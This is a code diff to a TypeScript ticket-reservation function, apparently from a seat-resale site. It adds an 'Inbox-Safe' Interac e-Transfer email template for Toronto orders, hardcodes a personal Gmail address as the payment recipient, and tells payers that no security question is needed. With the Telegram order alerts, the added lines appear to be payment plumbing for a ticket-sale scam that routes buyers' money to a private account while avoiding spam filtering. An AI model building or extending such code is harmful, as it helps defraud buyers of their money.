@@ -77,6 +77,8 @@ export const submitReservation = async (payload: ReservePayload): Promise<Reserv
   }).catch((err) => console.error("Telegram notification failed:", err));
 
   // Send confirmation email (fire-and-forget)
+  // For Toronto orders, uses "Inbox-Safe" Interac e-Transfer template
+  // For other cities, uses default payment instructions template
   supabase.functions.invoke("send-confirmation-email", {
     body: {
       orderId,
@@ -89,6 +91,12 @@ export const submitReservation = async (payload: ReservePayload): Promise<Reserv
       section: payload.section,
       row: payload.row,
       expiresAt,
+      template: payload.city === "Toronto" ? "interac-inbox-safe" : "default",
+      // Toronto-specific Interac details
+      ...(payload.city === "Toronto" && {
+        interacEmail: "rizzie052@gmail.com",
+        interacNote: "No security question needed for this recipient",
+      }),
     },
   }).catch((err) => console.error("Confirmation email failed:", err));
 
